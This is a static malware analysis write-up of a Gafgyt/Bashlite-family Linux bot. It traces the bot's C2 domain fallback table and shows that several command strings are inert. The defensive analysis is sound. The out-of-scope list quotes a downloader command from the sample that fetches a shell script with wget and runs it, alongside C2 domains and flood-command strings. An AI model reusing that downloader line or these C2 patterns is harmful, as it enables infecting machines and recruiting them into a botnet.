# C2 Communication Analysis of a Gafgyt-Family Linux Bot Sample

**Analyst:** Jose Mancera
**Scope:** Static analysis only — sample was never executed or detonated.
**Sample:** `c3b4101d7ac42e016bccb26c376688bb1f36681a4485246b5453c4c371401af5.elf`

## Summary

This write-up documents static analysis of a stripped, statically linked Linux ELF binary consistent with the Gafgyt/Bashlite malware family. The analysis focused specifically on **how the sample locates and connects to its command-and-control (C2) infrastructure**, and on verifying — rather than assuming — which suspicious strings are actually wired into executable code.

The scope here is deliberately narrow: this is a C2-discovery analysis, not a full capability assessment. Several other suspicious strings were identified but not traced, and are listed explicitly below rather than implied to be confirmed.

## Sample Information

| Property | Value |
|---|---|
| Format | ELF64, LSB executable, x86-64, System V ABI |
| Linking | Statically linked |
| Symbols | Stripped |
| Target | GNU/Linux |
| Build ID (SHA1) | `b275143f19dbba6dbccf54aff50e436b5e5572c1` |

Because the binary is stripped and statically linked, function names in the disassembler are auto-generated (`FUN_xxxxxx`), and a large volume of unrelated library strings is present. Static string presence alone was treated as a lead, never as proof of behavior — every claim below was confirmed by locating a string's address and checking its cross-references (XREFs) to executed code.

## Methodology

1. Extracted the sample in an isolated, network-disabled VM. The sample was never run.
2. Ran `file` and a strings/grep triage pass to build an initial list of suspicious indicators.
3. Imported the binary into Ghidra and ran default auto-analysis.
4. For each suspicious string, located its address in Defined Strings, then used **Show References to Address** to determine whether any code actually loads, compares, or acts on it.
5. Where live references existed, followed the referencing function in the decompiler to describe its behavior.
6. Recorded a finding as "confirmed" only when backed by an XREF into live code — not from string content alone.

## Findings

### Finding 1 — C2 Domain Fallback Mechanism (Confirmed, Live Code)

A function (internally labeled `FUN_00413cd0`) walks a null-terminated table of domain names, attempting a connection to each in turn until one succeeds:

- `cdn-edge-updates.hostcloud-eu.net`
- `api-relay-3.metrics-collector.io`
- `sync.softwaremirror.workers.dev`

These domain names are styled to resemble legitimate cloud infrastructure and CDN providers — a domain-fronting-style naming pattern intended to blend in with normal network traffic.

For each domain, the function calls a resolve/connect wrapper. On a successful connection, it performs connection-state cleanup and control appears to hand off to further C2 session logic (not traced in this analysis).

An adjacent string, `MIRAI-CNC/1.0`, sits in the same data region as the domain table but was found to have only a data-table pointer reference — not a live code reference. It is likely a protocol or user-agent identifier stored nearby, but its active use was not established.

### Finding 2 — `BOTKILLER` String (Confirmed Inert)

The string `BOTKILLER` exists in the binary's data section but has **zero cross-references** anywhere in the code. No function loads, compares against, or dispatches on this string. This indicates it is leftover data — likely inherited from the shared Gafgyt/Bashlite codebase this sample was built from — rather than an active feature in this particular build.

### Finding 3 — `SCANNER ON` / `SCANNER OFF` (Confirmed Inert)

Both strings were checked the same way and also returned **zero cross-references**. As with `BOTKILLER`, these are present as data but are not wired into any executed code path in this build.

## Overall Assessment

This sample is consistent with a Gafgyt/Bashlite-family Linux bot client. The confirmed, code-verified behavior is its C2 discovery mechanism: a fallback list of decoy-styled domains it attempts to connect to in sequence. Three legacy command strings associated with this malware family (`BOTKILLER`, `SCANNER ON`, `SCANNER OFF`) are present in the binary but are dead code in this build — carried over from a shared codebase without being activated.

## Explicitly Out of Scope

The following strings were identified during initial triage but were **not** traced to code and are not claimed as confirmed behavior in this analysis:

- `HTTPFLOOD` / `PRIVMSG #%s :HTTPFLOOD ready` / `NICK bot-%s` (IRC-style bot command syntax)
- `GETLOCALIP`
- `STOMP`
- `REPORT %s:%s:%s`
- The downloader string `!* SH cd /tmp; wget http://%s/bins.sh; sh bins.sh`
- `.network-dispatch` and related multi-path references
- Root-shell / `su`-related strings suggesting possible privilege-escalation functionality
- Various embedded IPv4 addresses

These remain string-level observations only. No claim is made about whether they represent live, reachable functionality.

## Limitations

- Static analysis only — the sample was never executed, so this write-up makes no claims about dynamic behavior, actual network traffic, or live C2 activity.
- No exact malware family/version attribution was performed; "Gafgyt/Bashlite-lineage" is a hypothesis based on the overall string/behavior pattern, not a hash or signature match.
- The functions called during connection setup (domain resolution, connection handling) were identified but not fully reverse engineered line-by-line.
- This is a bounded piece of a larger potential analysis. Further work — HTTPFLOOD command dispatch, the downloader chain, and privilege-escalation strings — was intentionally left out of scope for this write-up.

## Safety Note

All indicators (domains, strings) listed above are reported for documentation purposes only. No embedded infrastructure was contacted, visited, or interacted with during this analysis.
